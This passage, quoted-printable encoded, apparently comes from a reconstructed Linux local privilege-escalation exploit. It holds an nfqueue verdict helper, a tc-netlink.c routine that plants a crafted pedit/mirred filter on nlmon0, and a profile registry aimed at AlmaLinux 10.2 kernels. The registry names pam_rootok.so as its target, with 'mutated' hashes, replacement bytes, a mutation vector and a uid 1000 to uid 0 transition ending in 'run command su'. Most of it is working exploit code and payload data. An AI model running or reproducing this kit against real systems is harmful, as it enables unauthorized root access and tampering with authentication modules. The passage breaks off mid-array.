=09=09exit(EXIT_FAILURE);
=09}

=09nl =3D open_queue();
=09portid =3D mnl_socket_get_portid(nl);

=09for (;;) {
=09=09uint32_t id;

=09=09ret =3D mnl_socket_recvfrom(nl, buf, buflen);
=09=09if (ret =3D=3D -1) {
=09=09=09if (errno =3D=3D ENOBUFS || errno =3D=3D EINTR)
=09=09=09=09continue;

=09=09=09if (errno =3D=3D EAGAIN) {
=09=09=09=09errno =3D 0;
=09=09=09=09ret =3D 0;
=09=09=09=09break;
=09=09=09}

=09=09=09perror("mnl_socket_recvfrom");
=09=09=09exit(EXIT_FAILURE);
=09=09}

=09=09ret =3D mnl_cb_run(buf, ret, 0, portid, queue_cb, NULL);
=09=09if (ret < 0) {
=09=09=09/* bogus verdict mode will generate ENOENT error messages */
=09=09=09if (opts.bogus_verdict && errno =3D=3D ENOENT)
=09=09=09=09continue;
=09=09=09perror("mnl_cb_run");
=09=09=09exit(EXIT_FAILURE);
=09=09}

=09=09id =3D ret - MNL_CB_OK;
=09=09if (opts.delay_ms)
=09=09=09sleep_ms(opts.delay_ms);

=09=09if (opts.bogus_verdict) {
=09=09=09for (int i =3D 0; i < 50; i++) {
=09=09=09=09nlh =3D nfq_build_verdict(buf, id + 0x7FFFFFFF + i,
=09=09=09=09=09=09=09opts.queue_num, opts.verdict);
=09=09=09=09mnl_socket_sendto(nl, nlh, nlh->nlmsg_len);
=09=09=09}
=09=09}

=09=09if (opts.out_of_order) {
=09=09=09ooo_ids[ooo_count] =3D id;
=09=09=09if (ooo_count >=3D 15) {
=09=09=09=09for (; ooo_count >=3D 0; ooo_count--) {
=09=09=09=09=09nlh =3D nfq_build_verdict(buf, ooo_ids[ooo_count],
=09=09=09=09=09=09=09=09opts.queue_num, opts.verdict);
=09=09=09=09=09if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
=09=09=09=09=09=09perror("mnl_socket_sendto");
=09=09=09=09=09=09exit(EXIT_FAILURE);
=09=09=09=09=09}
=09=09=09=09}
=09=09=09=09ooo_count =3D 0;
=09=09=09} else {
=09=09=09=09ooo_count++;
=09=09=09}
=09=09} else {
=09=09=09nlh =3D nfq_build_verdict(buf, id, opts.queue_num, opts.verdict)=
;
=09=09=09if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
=09=09=09=09perror("mnl_socket_sendto");
=09=09=09=09exit(EXIT_FAILURE);
=09=09=09}
=09=09}
=09}

=09mnl_socket_close(nl);

=09return ret;
}

static void parse_opts(int argc, char **argv)
{
=09int c;

=09while ((c =3D getopt(argc, argv, "chvoObt:q:Q:d:G")) !=3D -1) {
=09=09switch (c) {
=09=09case 'c':
=09=09=09opts.count_packets =3D true;
=09=09=09break;
=09=09case 'h':
=09=09=09help(argv[0]);
=09=09=09exit(0);
=09=09=09break;
=09=09case 'q':
=09=09=09opts.queue_num =3D atoi(optarg);
=09=09=09if (opts.queue_num > 0xffff)
=09=09=09=09opts.queue_num =3D 0;
=09=09=09break;
=09=09case 'Q':
=09=09=09opts.verdict =3D atoi(optarg);
=09=09=09if (opts.verdict > 0xffff) {
=09=09=09=09fprintf(stderr, "Expected destination queue number\n");
=09=09=09=09exit(1);
=09=09=09}

=09=09=09opts.verdict <<=3D 16;
=09=09=09opts.verdict |=3D NF_QUEUE;
=09=09=09break;
=09=09case 'd':
=09=09=09opts.delay_ms =3D atoi(optarg);
=09=09=09if (opts.delay_ms =3D=3D 0) {
=09=09=09=09fprintf(stderr, "Expected nonzero delay (in milliseconds)\n")=
;
=09=09=09=09exit(1);
=09=09=09}
=09=09=09break;
=09=09case 't':
=09=09=09opts.timeout =3D atoi(optarg);
=09=09=09break;
=09=09case 'G':
=09=09=09opts.gso_enabled =3D false;
=09=09=09break;
=09=09case 'o':
=09=09=09opts.failopen =3D true;
=09=09=09break;
=09=09case 'v':
=09=09=09opts.verbose++;
=09=09=09break;
=09=09case 'O':
=09=09=09opts.out_of_order =3D true;
=09=09=09break;
=09=09case 'b':
=09=09=09opts.bogus_verdict =3D true;
=09=09=09break;
=09=09}
=09}

=09if (opts.verdict !=3D NF_ACCEPT && (opts.verdict >> 16 =3D=3D opts.que=
ue_num)) {
=09=09fprintf(stderr, "Cannot use same destination and source queue\n");
=09=09exit(1);
=09}
}

int main(int argc, char *argv[])
{
=09int ret;

=09opts.verdict =3D NF_ACCEPT;
=09opts.gso_enabled =3D true;

=09parse_opts(argc, argv);

=09ret =3D mainloop();
=09if (opts.count_packets)
=09=09print_stats();

=09return ret;
}

~~~

### tc-netlink.c

~~~c
// SPDX-License-Identifier: GPL-2.0
/*
 * Behavior-faithful reconstruction of tc-netlink.c.
 * Provenance: ELF 0x40a320..0x40ae42.  The original was compiled twice f=
or
 * 22-key/88-byte and 24-key/96-byte frames; this source shares one core.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <libmnl/libmnl.h>
#include <linux/if_ether.h>
#include <linux/netlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tc_act/tc_mirred.h>
#include <linux/tc_act/tc_pedit.h>
#include <net/if.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>

#include "unified.h"

#define TC_BUFSZ 16384
#define MAX_PEDIT_KEYS 24

static unsigned int tc_seq;

static int send_ack(struct mnl_socket *nl, struct nlmsghdr *nlh,
                    unsigned int portid)
{
    char buf[TC_BUFSZ];
    int ret;

    if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
        return -1;
    do {
        ret =3D mnl_socket_recvfrom(nl, buf, sizeof(buf));
        if (ret < 0)
            return -1;
        ret =3D mnl_cb_run(buf, ret, nlh->nlmsg_seq, portid, NULL, NULL);
    } while (ret > 0);
    return ret =3D=3D MNL_CB_STOP ? 0 : -1;
}

static int add_clsact(struct mnl_socket *nl, unsigned int portid,
                      unsigned int ifindex)
{
    char buf[TC_BUFSZ] =3D {0};
    struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(buf);
    struct tcmsg *tcm;

    nlh->nlmsg_type =3D RTM_NEWQDISC;
    nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_=
F_ACK;
    nlh->nlmsg_seq =3D ++tc_seq;
    tcm =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*tcm));
    tcm->tcm_family =3D AF_UNSPEC;
    tcm->tcm_ifindex =3D (int)ifindex;
    tcm->tcm_handle =3D TC_H_MAKE(TC_H_CLSACT, 0);
    tcm->tcm_parent =3D TC_H_CLSACT;
    mnl_attr_put_strz(nlh, TCA_KIND, "clsact");
    return send_ack(nl, nlh, portid);
}

struct pedit_options {
    struct tc_pedit_sel selector;
    struct tc_pedit_key keys[MAX_PEDIT_KEYS];
};

static int add_filter(struct mnl_socket *nl, unsigned int portid,
                      unsigned int source_ifindex,
                      unsigned int destination_ifindex,
                      const uint8_t *frame, size_t key_count)
{
    char buf[TC_BUFSZ] =3D {0};
    struct nlmsghdr *nlh =3D mnl_nlmsg_put_header(buf);
    struct tcmsg *tcm;
    struct nlattr *options, *actions, *action, *action_options;
    struct tc_u32_sel selector =3D {0};
    struct pedit_options pedit =3D {0};
    struct tc_mirred mirred =3D {0};
    size_t i;

    nlh->nlmsg_type =3D RTM_NEWTFILTER;
    nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_=
F_ACK;
    nlh->nlmsg_seq =3D ++tc_seq;
    tcm =3D mnl_nlmsg_put_extra_header(nlh, sizeof(*tcm));
    tcm->tcm_family =3D AF_UNSPEC;
    tcm->tcm_ifindex =3D (int)source_ifindex;
    tcm->tcm_parent =3D TC_H_MAKE(TC_H_CLSACT, TC_H_MIN_EGRESS);
    tcm->tcm_info =3D TC_H_MAKE(1U << 16, htons(ETH_P_ALL));

    selector.flags =3D TC_U32_TERMINAL;
    selector.nkeys =3D 1;
    mnl_attr_put_strz(nlh, TCA_KIND, "u32");
    options =3D mnl_attr_nest_start(nlh, TCA_OPTIONS);
    mnl_attr_put(nlh, TCA_U32_SEL, sizeof(selector), &selector);
    actions =3D mnl_attr_nest_start(nlh, TCA_U32_ACT);

    action =3D mnl_attr_nest_start(nlh, 1);
    pedit.selector.action =3D TC_ACT_PIPE;
    pedit.selector.nkeys =3D (unsigned char)key_count;
    for (i =3D 0; i < key_count; i++) {
        uint32_t value;

        memcpy(&value, frame + i * sizeof(value), sizeof(value));
        pedit.keys[i].mask =3D 0;
        pedit.keys[i].val =3D value;
        pedit.keys[i].off =3D (uint32_t)(i * sizeof(value));
    }
    mnl_attr_put_strz(nlh, TCA_ACT_KIND, "pedit");
    action_options =3D mnl_attr_nest_start(nlh, TCA_ACT_OPTIONS);
    mnl_attr_put(nlh, TCA_PEDIT_PARMS,
                 sizeof(pedit.selector) + key_count * sizeof(pedit.keys[0=
]),
                 &pedit);
    mnl_attr_nest_end(nlh, action_options);
    mnl_attr_nest_end(nlh, action);

    action =3D mnl_attr_nest_start(nlh, 2);
    mirred.action =3D TC_ACT_STOLEN;
    mirred.eaction =3D TCA_EGRESS_REDIR;
    mirred.ifindex =3D (int)destination_ifindex;
    mnl_attr_put_strz(nlh, TCA_ACT_KIND, "mirred");
    action_options =3D mnl_attr_nest_start(nlh, TCA_ACT_OPTIONS);
    mnl_attr_put(nlh, TCA_MIRRED_PARMS, sizeof(mirred), &mirred);
    mnl_attr_nest_end(nlh, action_options);
    mnl_attr_nest_end(nlh, action);

    mnl_attr_nest_end(nlh, actions);
    mnl_attr_nest_end(nlh, options);
    return send_ack(nl, nlh, portid);
}

static int tc_netlink_setup(const uint8_t *frame, size_t length)
{
    struct mnl_socket *nl;
    unsigned int nlmon_index, loopback_index, portid;
    size_t key_count;
    int saved_errno, rc =3D -1;

    if (!frame || (length !=3D 88 && length !=3D 96)) {
        errno =3D EINVAL;
        return -1;
    }
    key_count =3D length / sizeof(uint32_t);
    nlmon_index =3D if_nametoindex("nlmon0");
    loopback_index =3D if_nametoindex("lo");
    if (!nlmon_index || !loopback_index)
        return -1;
    nl =3D mnl_socket_open(NETLINK_ROUTE);
    if (!nl)
        return -1;
    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
        goto out;
    portid =3D mnl_socket_get_portid(nl);
    if (add_clsact(nl, portid, nlmon_index) < 0) {
        fprintf(stderr, "TC_NETLINK_SETUP stage=3Dclsact status=3DFAIL er=
rno=3D%d error=3D%s\n",
                errno, strerror(errno));
        goto out;
    }
    if (add_filter(nl, portid, nlmon_index, loopback_index,
                   frame, key_count) < 0) {
        fprintf(stderr, "TC_NETLINK_SETUP stage=3Dfilter status=3DFAIL er=
rno=3D%d error=3D%s\n",
                errno, strerror(errno));
        goto out;
    }
    printf("TC_NETLINK_SETUP device=3Dnlmon0 hook=3Degress classifier=3Du=
32 "
           "pedit_keys=3D%zu redirect=3Dlo status=3DPASS\n", key_count);
    rc =3D 0;
out:
    saved_errno =3D errno;
    mnl_socket_close(nl);
    errno =3D saved_errno;
    return rc;
}

int tc_netlink_setup_88(const uint8_t *frame, size_t length)
{
    if (length !=3D 88) {
        errno =3D EINVAL;
        return -1;
    }
    return tc_netlink_setup(frame, length);
}

int tc_netlink_setup_96(const uint8_t *frame, size_t length)
{
    if (length !=3D 96) {
        errno =3D EINVAL;
        return -1;
    }
    return tc_netlink_setup(frame, length);
}

~~~

### profile_registry.c

~~~c
/* Recovered from compiled_profiles at 0x89e200; generated by ExportUnifi=
ed.java. */
#include <stdint.h>
#include <stddef.h>
#include "profile.h"

const struct profile compiled_profiles[PROFILE_COUNT] =3D {
  [0] =3D {
    .profile_id =3D "almalinux102",
    .evidence_aliases =3D "almalinux102-host-poc",
    .kernel_releases =3D "6.12.0-211.33.1.el10_2.x86_64",
    .distribution_id =3D "almalinux",
    .distribution_version =3D "10.2",
    .package_name =3D "pam",
    .package_versions =3D "1.6.1-9.el10",
    .filesystem =3D "xfs",
    .lsm_constraint =3D "selinux:Enforcing",
    .target_path =3D "/usr/lib64/security/pam_rootok.so",
    .target_build_id =3D "c41ef4543d1898827ae885dbcf1b853620756a05",
    .baseline_sha256 =3D "785ba95a79de7bd53ad3a105018b597b4a8aadab343bdb1=
01fa6ef3e1a1c2906",
    .mutated_sha256 =3D "38452773ae668f0d4c07635c311a63c2cd43bef5b5442e97=
9720a45e7df57ed4",
    .backing_page_sha256 =3D "a16e8a5c3e423ccfd3b23c5ff601461e8ff2a83e5e3=
58d211a7fe79902407d01",
    .package_query =3D "rpm",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "xfs_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "almalinux102-recovery",
    .recovery_sha256 =3D "7d0ad90bb081d6174549dac70119fe363e0e8924fad4917=
42926a453a7ad0871",
    .distribution_suite =3D "",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0755, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3cc0), .target_offset =3D UINT64_C(0x43d)=
,
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 0,
    .guard_before =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
xbb, 0x00, 0x00, 0x00, 0x12
    }, .original_slice =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    }, .desired_slice =3D {
      0x03, 0x0f, 0x00, 0x50, 0x16, 0x00, 0x00, 0x00
    }, .guard_after =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x2e, 0x01, 0x00, 0x00, 0x12
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x9b, 0=
xf7, 0x8d, 0x29, 0x68, 0xf6, 
      0x76, 0x61, 0xa3, 0xc8, 0xfd, 0x06, 0x1a, 0xad, 0xac, 0x28, 0xbf, 0=
xf3, 0x2a, 0x3f, 0xcb, 0xec, 
      0xcd, 0xa7, 0x3b, 0x86, 0xa0, 0x5a, 0xb6, 0x09, 0x41, 0x4c, 0x55, 0=
x10, 0x95, 0x61, 0x2a, 0x51, 
      0x91, 0xf0, 0xac, 0xd7, 0x08, 0xdb, 0x12, 0xb0, 0x9a, 0x4b, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x15, 0xab, 0xb8, 0x87, 0xdf, 0x54, 0x54, 0x7c, 0x28, 0=
x3d, 0xab, 0x7f, 0x1c, 0xe8, 
      0x31, 0x67, 0x88, 0xb6, 0x6c, 0x37, 0xad, 0x00, 0xef, 0x3e, 0xec, 0=
x6f, 0x66, 0x08, 0x27, 0x05, 
      0xaf, 0x8a, 0xe1, 0xa5, 0x19, 0xd0, 0x7d, 0x0a, 0xd6, 0x1d, 0x20, 0=
x96, 0x7f, 0xdf, 0x70, 0xc3, 
      0x90, 0xd1, 0x24, 0x58, 0x57, 0x8a, 0x2b, 0x83, 0xf4, 0x19, 0xd5, 0=
x73, 0xdc, 0xab, 0x9f, 0x72, 
      0x79, 0x9c, 0x41, 0xfd, 0x1b, 0x2a, 0x1c, 0x62, 0x93, 0x38, 0x64, 0=
x71, 0xce, 0x44, 0x3a, 0x1c, 
      0xc4, 0x7d, 0x02, 0x96, 0x0f, 0xe4, 0x5a, 0xd2, 0x50, 0x86, 0x8b, 0=
x8e, 0xc7, 0xcb, 0xac, 0x6a, 
      0xf1, 0x80, 0xa4, 0x26, 0x83, 0x5a, 0x71, 0x9d, 0x0b, 0xd6, 0x33, 0=
x18, 0xe1, 0x58, 0x54, 0x39, 
      0xee, 0xd7, 0x4b, 0x16, 0xaf, 0xfd, 0xa3, 0x1f, 0xa6, 0x08, 0x29, 0=
x0d, 0x0f, 0x24, 0x17, 0x9a, 
      0x2e, 0x8c, 0xba, 0x14, 0x68, 0x10, 0xc8, 0x4a, 0x6d, 0xd6, 0xbe, 0=
x9a, 0xe2, 0x29, 0xc1, 0x32, 
      0xcd, 0x32, 0x2e, 0xea, 0x69, 0x5c, 0x33, 0x54, 0x3b, 0x04, 0x81, 0=
x8c, 0x12, 0x65, 0x97, 0x54, 
      0xfe, 0x86, 0x77, 0xbb, 0x30, 0xd6, 0x00, 0x75, 0x14, 0x32, 0xfa, 0=
x14, 0x53, 0x37, 0xce, 0x5b, 
      0xbf, 0x8f, 0xaa, 0x60, 0x5a, 0x40, 0x49, 0xdf, 0xde, 0xbf, 0x76, 0=
x2e, 0xe9, 0xc8, 0x3a, 0x02, 
      0x5e, 0x5b, 0xdd, 0x69, 0x91, 0x91, 0xca, 0x84, 0x6e, 0x61, 0xa3, 0=
x13, 0xaf, 0x9b, 0x1c, 0x0a, 
      0x4e, 0xc7, 0x52, 0xb5, 0x50, 0xf5, 0xa5, 0x62, 0x95, 0x0b, 0xec, 0=
x0f, 0x60, 0xaf, 0xb9, 0xe7, 
      0x67, 0xb2, 0x2d, 0xa8, 0xa4, 0x68, 0x5e, 0xce, 0x57, 0x8f, 0xa8, 0=
xd4, 0x43, 0x8d, 0x49, 0x0c, 
      0x77, 0x04, 0x81, 0x4b, 0x20, 0x4c, 0xf2, 0xb3, 0x59, 0x88, 0xbc, 0=
x99, 0x9b, 0x66, 0x98, 0xf4, 
      0x04, 0x0d, 0x10, 0x7f, 0xb6, 0xab, 0xb2, 0x7c, 0x79, 0x0d, 0xdc, 0=
x9b, 0x66, 0x78, 0xe9, 0xcb, 
      0xd6, 0xf4, 0x68, 0x8c, 0x8a, 0x94, 0xcb, 0x93, 0xd2, 0x68, 0x40, 0=
x2d, 0xf7, 0xd5, 0x3a, 0x7c, 
      0x6e, 0x5c, 0x78, 0x4d, 0x17, 0xb7, 0x2e, 0x14, 0x32, 0x49, 0x2a, 0=
x07, 0xbb, 0x4e, 0xda, 0x42, 
      0x7a, 0x48, 0x99, 0x37, 0x6b, 0x74, 0xdd, 0xb6, 0x2b, 0x06, 0xe9, 0=
x3c, 0xe3, 0x1e, 0x21, 0xae, 
      0x25, 0xcb, 0x73, 0xb7, 0x5a, 0x69, 0xfd, 0x82, 0xf6, 0x2d, 0xea, 0=
xf3, 0x69, 0xe1, 0xc2, 0xc0, 
      0x6a, 0x74, 0xc0, 0x76, 0xaa, 0x12, 0x7e, 0xa7, 0x4f, 0xee, 0xf5, 0=
x83, 0x28, 0x90, 0x45, 0x3f, 
      0xd3, 0xfa, 0xc9, 0xa6, 0x97, 0xa0, 0x4e, 0x48, 0x39, 0x4f, 0xdb, 0=
xaf, 0x48, 0x14, 0x6e, 0x58, 
      0xea, 0x0e, 0xf6, 0x17, 0xa9, 0xf5, 0x62, 0x3e, 0x76, 0xef, 0x83, 0=
x90, 0x4b, 0xd2, 0xd1, 0xb2, 
      0x51, 0xce, 0x9d, 0x57, 0xc2, 0x36, 0xa7, 0xc8, 0x67, 0x61, 0x5b, 0=
x19, 0xfa, 0x71, 0x13, 0xc8, 
      0xff, 0xdc, 0x70, 0xbf, 0xe7, 0xf3, 0xe6, 0xba, 0x64, 0xde, 0x56, 0=
x0f, 0x28, 0xf2, 0xae, 0xfa, 
      0x11, 0xeb, 0xea, 0x52, 0xf8, 0x7c, 0x4b, 0x36, 0xf6, 0x4a, 0xb6, 0=
xf6, 0x3f, 0x2c, 0x8e, 0x33, 
      0x9e, 0xa4, 0xb1, 0x50, 0x97, 0xf0, 0x17, 0x79, 0x83, 0x4b, 0x00, 0=
x68, 0x71, 0x37, 0xb8, 0x25, 
      0x36, 0xb0, 0x98, 0x83, 0x15, 0x18, 0xbe, 0xd4, 0xe4, 0x18, 0x17, 0=
x4f, 0xb1, 0x58, 0xe6, 0x08, 
      0x4f, 0xf9, 0x31, 0xb9, 0x92, 0x8a, 0xb0, 0xcb, 0x20, 0x60, 0x01, 0=
xe3, 0xb4, 0x36, 0xb9, 0x70, 
      0x0d, 0xbd, 0xc4, 0x93, 0x81, 0x1d, 0x0d, 0xcb, 0x64, 0x3f, 0xb0, 0=
x7e, 0x42, 0x4c, 0x87, 0xe4, 
      0x9b, 0x80, 0x2a, 0xbe, 0xd5, 0x0d, 0xa8, 0xb7, 0xf4, 0xa1, 0x0b, 0=
xad, 0xb1, 0x98, 0x55, 0x6d, 
      0x04, 0xb2
    },
  },
  [1] =3D {
    .profile_id =3D "almalinux102-k612-21134",
    .evidence_aliases =3D "almalinux102-k612-21134-host-poc-v5-inverse-re=
covery,almalinux102-stock-media-k612-2117-safe-validated",
    .kernel_releases =3D "6.12.0-211.34.1.el10_2.x86_64,6.12.0-211.7.3.el=
10_2.x86_64",
    .distribution_id =3D "almalinux",
    .distribution_version =3D "10.2",
    .package_name =3D "pam",
    .package_versions =3D "1.6.1-9.el10",
    .filesystem =3D "xfs",
    .lsm_constraint =3D "selinux:Enforcing",
    .target_path =3D "/usr/lib64/security/pam_rootok.so",
    .target_build_id =3D "c41ef4543d1898827ae885dbcf1b853620756a05",
    .baseline_sha256 =3D "785ba95a79de7bd53ad3a105018b597b4a8aadab343bdb1=
01fa6ef3e1a1c2906",
    .mutated_sha256 =3D "38452773ae668f0d4c07635c311a63c2cd43bef5b5442e97=
9720a45e7df57ed4",
    .backing_page_sha256 =3D "a16e8a5c3e423ccfd3b23c5ff601461e8ff2a83e5e3=
58d211a7fe79902407d01",
    .package_query =3D "rpm",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "xfs_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "almalinux102-k612-21134-recovery",
    .recovery_sha256 =3D "931244a44241a25d415bd3a7316dba1102b6c5bbfa59cb2=
5c76872ff118fb398",
    .distribution_suite =3D "",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0755, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3cc0), .target_offset =3D UINT64_C(0x43d)=
,
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
xbb, 0x00, 0x00, 0x00, 0x12
    }, .original_slice =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    }, .desired_slice =3D {
      0x03, 0x0f, 0x00, 0x50, 0x16, 0x00, 0x00, 0x00
    }, .guard_after =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x2e, 0x01, 0x00, 0x00, 0x12
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x9b, 0=
xf7, 0x8d, 0x29, 0x68, 0xf6, 
      0x76, 0x61, 0xa3, 0xc8, 0xfd, 0x06, 0x1a, 0xad, 0xac, 0x28, 0xbf, 0=
xf3, 0x2a, 0x3f, 0xcb, 0xec, 
      0xcd, 0xa7, 0x3b, 0x86, 0xa0, 0x5a, 0xb6, 0x09, 0x41, 0x4c, 0x55, 0=
x10, 0x95, 0x61, 0x2a, 0x51, 
      0x91, 0xf0, 0xac, 0xd7, 0x08, 0xdb, 0x12, 0xb0, 0x9a, 0x4b, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x15, 0xab, 0xb8, 0x87, 0xdf, 0x54, 0x54, 0x7c, 0x28, 0=
x3d, 0xab, 0x7f, 0x1c, 0xe8, 
      0x31, 0x67, 0x88, 0xb6, 0x6c, 0x37, 0xad, 0x00, 0xef, 0x3e, 0xec, 0=
x6f, 0x66, 0x08, 0x27, 0x05, 
      0xaf, 0x8a, 0xe1, 0xa5, 0x19, 0xd0, 0x7d, 0x0a, 0xd6, 0x1d, 0x20, 0=
x96, 0x7f, 0xdf, 0x70, 0xc3, 
      0x90, 0xd1, 0x24, 0x58, 0x57, 0x8a, 0x2b, 0x83, 0xf4, 0x19, 0xd5, 0=
x73, 0xdc, 0xab, 0x9f, 0x72, 
      0x79, 0x9c, 0x41, 0xfd, 0x1b, 0x2a, 0x1c, 0x62, 0x93, 0x38, 0x64, 0=
x71, 0xce, 0x44, 0x3a, 0x1c, 
      0xc4, 0x7d, 0x02, 0x96, 0x0f, 0xe4, 0x5a, 0xd2, 0x50, 0x86, 0x8b, 0=
x8e, 0xc7, 0xcb, 0xac, 0x6a, 
      0xf1, 0x80, 0xa4, 0x26, 0x83, 0x5a, 0x71, 0x9d, 0x0b, 0xd6, 0x33, 0=
x18, 0xe1, 0x58, 0x54, 0x39, 
      0xee, 0xd7, 0x4b, 0x16, 0xaf, 0xfd, 0xa3, 0x1f, 0xa6, 0x08, 0x29, 0=
x0d, 0x0f, 0x24, 0x17, 0x9a, 
      0x2e, 0x8c, 0xba, 0x14, 0x68, 0x10, 0xc8, 0x4a, 0x6d, 0xd6, 0xbe, 0=
x9a, 0xe2, 0x29, 0xc1, 0x32, 
      0xcd, 0x32, 0x2e, 0xea, 0x69, 0x5c, 0x33, 0x54, 0x3b, 0x04, 0x81, 0=
x8c, 0x12, 0x65, 0x97, 0x54, 
      0xfe, 0x86, 0x77, 0xbb, 0x30, 0xd6, 0x00, 0x75, 0x14, 0x32, 0xfa, 0=
x14, 0x53, 0x37, 0xce, 0x5b, 
      0xbf, 0x8f, 0xaa, 0x60, 0x5a, 0x40, 0x49, 0xdf, 0xde, 0xbf, 0x76, 0=
x2e, 0xe9, 0xc8, 0x3a, 0x02, 
      0x5e, 0x5b, 0xdd, 0x69, 0x91, 0x91, 0xca, 0x84, 0x6e, 0x61, 0xa3, 0=
x13, 0xaf, 0x9b, 0x1c, 0x0a, 
      0x4e, 0xc7, 0x52, 0xb5, 0x50, 0xf5, 0xa5, 0x62, 0x95, 0x0b, 0xec, 0=
x0f, 0x60, 0xaf, 0xb9, 0xe7, 
      0x67, 0xb2, 0x2d, 0xa8, 0xa4, 0x68, 0x5e, 0xce, 0x57, 0x8f, 0xa8, 0=
xd4, 0x43, 0x8d, 0x49, 0x0c, 
      0x77, 0x04, 0x81, 0x4b, 0x20, 0x4c, 0xf2, 0xb3, 0x59, 0x88, 0xbc, 0=
x99, 0x9b, 0x66, 0x98, 0xf4, 
      0x04, 0x0d, 0x10, 0x7f, 0xb6, 0xab, 0xb2, 0x7c, 0x79, 0x0d, 0xdc, 0=
x9b, 0x66, 0x78, 0xe9, 0xcb, 
      0xd6, 0xf4, 0x68, 0x8c, 0x8a, 0x94, 0xcb, 0x93, 0xd2, 0x68, 0x40, 0=
x2d, 0xf7, 0xd5, 0x3a, 0x7c, 
      0x6e, 0x5c, 0x78, 0x4d, 0x17, 0xb7, 0x2e, 0x14, 0x32, 0x49, 0x2a, 0=
x07, 0xbb, 0x4e, 0xda, 0x42, 
      0x7a, 0x48, 0x99, 0x37, 0x6b, 0x74, 0xdd, 0xb6, 0x2b, 0x06, 0xe9, 0=
x3c, 0xe3, 0x1e, 0x21, 0xae, 
      0x25, 0xcb, 0x73, 0xb7, 0x5a, 0x69, 0xfd, 0x82, 0xf6, 0x2d, 0xea, 0=
xf3, 0x69, 0xe1, 0xc2, 0xc0, 
      0x6a, 0x74, 0xc0, 0x76, 0xaa, 0x12, 0x7e, 0xa7, 0x4f, 0xee, 0xf5, 0=
x83, 0x28, 0x90, 0x45, 0x3f, 
      0xd3, 0xfa, 0xc9, 0xa6, 0x97, 0xa0, 0x4e, 0x48, 0x39, 0x4f, 0xdb, 0=
xaf, 0x48, 0x14, 0x6e, 0x58, 
      0xea, 0x0e, 0xf6, 0x17, 0xa9, 0xf5, 0x62, 0x3e, 0x76, 0xef, 0x83, 0=
x90, 0x4b, 0xd2, 0xd1, 0xb2, 
      0x51, 0xce, 0x9d, 0x57, 0xc2, 0x36, 0xa7, 0xc8, 0x67, 0x61, 0x5b, 0=
x19, 0xfa, 0x71, 0x13, 0xc8, 
      0xff, 0xdc, 0x70, 0xbf, 0xe7, 0xf3, 0xe6, 0xba, 0x64, 0xde, 0x56, 0=
x0f, 0x28, 0xf2, 0xae, 0xfa, 
      0x11, 0xeb, 0xea, 0x52, 0xf8, 0x7c, 0x4b, 0x36, 0xf6, 0x4a, 0xb6, 0=
xf6, 0x3f, 0x2c, 0x8e, 0x33, 
